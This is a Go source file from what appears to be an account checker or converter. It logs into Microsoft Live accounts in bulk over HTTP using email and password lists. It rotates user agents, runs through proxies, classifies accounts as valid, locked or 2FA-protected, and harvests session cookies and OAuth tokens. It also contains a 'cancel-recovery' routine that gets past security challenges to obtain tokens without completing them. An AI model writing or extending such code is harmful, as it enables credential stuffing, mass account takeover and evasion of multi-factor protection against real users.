package converter

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// Fast path: the entire Microsoft login is done over plain HTTP, mirroring
// the MSMC flow already proven by the checker (PPFT/sFTTag → credential POST
// → OAuth token). No browser is needed, so thousands of accounts convert on
// a 4GB / 2 vCPU machine in minutes with almost no RAM. The session cookies
// set by login.live.com are captured from the jar and written to the
// Netscape output file.

const httpLoginURL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

var (
	reSFTPTagValue  = regexp.MustCompile(`(?s)value=\\"(.+?)\\"`)
	reSFTPTagPlain  = regexp.MustCompile(`(?s)value="(.+?)"`)
	reURLPostQuoted = regexp.MustCompile(`(?s)"urlPost":"(.+?)"`)
	reURLPostSingle = regexp.MustCompile(`(?s)urlPost:'(.+?)'`)
	reIPT           = regexp.MustCompile(`"ipt" value="(.+?)">`)
	rePPRID         = regexp.MustCompile(`"pprid" value="(.+?)">`)
	reUAID          = regexp.MustCompile(`"uaid" value="(.+?)">`)
	reFMHF          = regexp.MustCompile(`id="fmHF" action="(.+?)"`)
	reRecoveryRet   = regexp.MustCompile(`"recoveryCancel":{"returnUrl":"(.+?)"`)
	reAccessTokenQ  = regexp.MustCompile(`access_token%3D([^&%]+)`)
	reAccessTok1    = regexp.MustCompile(`access_token["']?\s*[:=]\s*["']?([^&"'\s#<>]+)`)
	reAccessTok2    = regexp.MustCompile(`"access_token":"([^"]+)"`)
	reAccessTok3    = regexp.MustCompile(`access_token=([^&"'\s#<>]+)`)
)

var httpUAPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
}

// NewHTTPClient builds a per-account client with a fresh cookie jar.
// The transport is shared per proxy by the engine for connection reuse.
func NewHTTPClient(transport http.RoundTripper) *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   20 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 30 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func extractAccessToken(uri, text string) string {
	if i := strings.Index(uri, "#"); i != -1 {
		for _, part := range strings.Split(uri[i+1:], "&") {
			if strings.HasPrefix(part, "access_token=") {
				if v, err := url.QueryUnescape(part[len("access_token="):]); err == nil {
					return v
				}
			}
		}
	}
	if parsed, err := url.Parse(uri); err == nil && parsed.RawQuery != "" {
		for _, part := range strings.Split(parsed.RawQuery, "&") {
			if strings.HasPrefix(part, "access_token=") {
				if v, err := url.QueryUnescape(part[len("access_token="):]); err == nil {
					return v
				}
			}
			if strings.Contains(part, "access_token%3D") {
				if m := reAccessTokenQ.FindStringSubmatch(part); m != nil {
					if v, err := url.QueryUnescape(m[1]); err == nil {
						return v
					}
				}
			}
		}
	}
	var data map[string]interface{}
	if json.Unmarshal([]byte(text), &data) == nil {
		if tok, ok := data["access_token"].(string); ok {
			return tok
		}
	}
	for _, re := range []*regexp.Regexp{reAccessTok1, reAccessTok2, reAccessTok3} {
		if m := re.FindStringSubmatch(text); m != nil {
			if v, err := url.QueryUnescape(m[1]); err == nil {
				return v
			}
		}
	}
	return ""
}

func httpGetLoginTokens(client *http.Client) (urlPost, sFTTag string) {
	req, err := http.NewRequest("GET", httpLoginURL, nil)
	if err != nil {
		return "", ""
	}
	req.Header.Set("User-Agent", pickHTTPUA())
	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", ""
	}
	text := string(body)

	m := reSFTPTagValue.FindStringSubmatch(text)
	if len(m) == 0 {
		m = reSFTPTagPlain.FindStringSubmatch(text)
	}
	if len(m) == 0 {
		return "", ""
	}
	sFTTag = m[1]

	m = reURLPostQuoted.FindStringSubmatch(text)
	if len(m) == 0 {
		m = reURLPostSingle.FindStringSubmatch(text)
	}
	if len(m) > 0 {
		urlPost = m[1]
	}
	return urlPost, sFTTag
}

// HTTPLoginLive runs the full login over HTTP and returns the session
// cookies from the jar, the OAuth access token, and a status:
//
//	success     - token acquired (cookies are the login.live.com session)
//	mfa         - 2FA / security challenge required
//	invalid     - bad credentials / account doesn't exist
//	locked      - account locked
//	captcha     - bot check presented (worth a browser attempt)
//	dom         - unexpected page (worth a browser attempt)
//	network     - request-level failure (transient, retry)
func HTTPLoginLive(client *http.Client, email, password string) ([]Cookie, string, Status) {
	urlPost, sFTTag := httpGetLoginTokens(client)
	if urlPost == "" || sFTTag == "" {
		return nil, "", StatusNetwork
	}

	form := url.Values{}
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("passwd", password)
	form.Set("PPFT", sFTTag)

	req, err := http.NewRequest("POST", urlPost, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, "", StatusNetwork
	}
	req.Header.Set("User-Agent", pickHTTPUA())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return nil, "", StatusNetwork
	}
	body, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return nil, "", StatusNetwork
	}
	text := string(body)
	finalURL := resp.Request.URL.String()

	if strings.Contains(finalURL, "#") && finalURL != httpLoginURL {
		if tok := extractAccessToken(finalURL, text); tok != "" {
			return cookiesFromClient(client), tok, StatusSuccess
		}
	}

	// MSMC cancel-recovery flow: 2FA-style pages with a cancel path return
	// the token without completing the challenge.
	if strings.Contains(text, "cancel?mkt=") {
		ipt := reIPT.FindStringSubmatch(text)
		pprid := rePPRID.FindStringSubmatch(text)
		uaid := reUAID.FindStringSubmatch(text)
		fmHF := reFMHF.FindStringSubmatch(text)
		if len(ipt) > 0 && len(pprid) > 0 && len(uaid) > 0 && len(fmHF) > 0 {
			cancelForm := url.Values{}
			cancelForm.Set("ipt", ipt[1])
			cancelForm.Set("pprid", pprid[1])
			cancelForm.Set("uaid", uaid[1])
			if creq, err := http.NewRequest("POST", fmHF[1], strings.NewReader(cancelForm.Encode())); err == nil {
				creq.Header.Set("User-Agent", pickHTTPUA())
				creq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				if cresp, err := client.Do(creq); err == nil {
					cbody, _ := io.ReadAll(cresp.Body)
					cresp.Body.Close()
					ret := reRecoveryRet.FindStringSubmatch(string(cbody))
					if len(ret) > 0 {
						if rreq, err := http.NewRequest("GET", ret[1], nil); err == nil {
							rreq.Header.Set("User-Agent", pickHTTPUA())
							if rresp, err := client.Do(rreq); err == nil {
								rbody, _ := io.ReadAll(rresp.Body)
								rresp.Body.Close()
								if tok := extractAccessToken(rresp.Request.URL.String(), string(rbody)); tok != "" {
									return cookiesFromClient(client), tok, StatusSuccess
								}
							}
						}
					}
				}
			}
		}
	}

	lower := strings.ToLower(text)
	for _, marker := range []string{"recover?mkt", "account.live.com/identity/confirm?mkt", "email/confirm?mkt", "/abuse?mkt="} {
		if strings.Contains(lower, marker) {
			return nil, "", StatusMFA
		}
	}
	for _, marker := range []string{"password is incorrect", "account doesn't exist.", "we couldn't find a microsoft account", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"} {
		if strings.Contains(lower, marker) {
			return nil, "", StatusInvalid
		}
	}
	if strings.Contains(lower, "account has been locked") || strings.Contains(lower, "temporarily locked") {
		return nil, "", StatusLocked
	}
	if strings.Contains(lower, "confirm you're not a bot") || strings.Contains(lower, "confirm you are not a robot") || strings.Contains(lower, "captcha") {
		return nil, "", StatusCaptcha
	}
	return nil, "", StatusDOM
}

// cookiesFromClient converts the jar's login.live.com session into the
// converter's cookie shape.
func cookiesFromClient(client *http.Client) []Cookie {
	if client == nil || client.Jar == nil {
		return nil
	}
	ref, _ := url.Parse(httpLoginURL)
	raw := client.Jar.Cookies(ref)
	out := make([]Cookie, 0, len(raw))
	for _, c := range raw {
		if c.Name == "" || c.Value == "" {
			continue
		}
		hostOnly := !strings.HasPrefix(c.Domain, ".")
		out = append(out, Cookie{
			Domain:   c.Domain,
			Path:     c.Path,
			Name:     c.Name,
			Value:    c.Value,
			Secure:   c.Secure,
			HTTPOnly: c.HttpOnly,
			HostOnly: hostOnly,
			Expires:  c.Expires.Unix(),
		})
	}
	return out
}

func pickHTTPUA() string {
	return httpUAPool[defaultUAIndex.Add(1)%uint64(len(httpUAPool))]
}
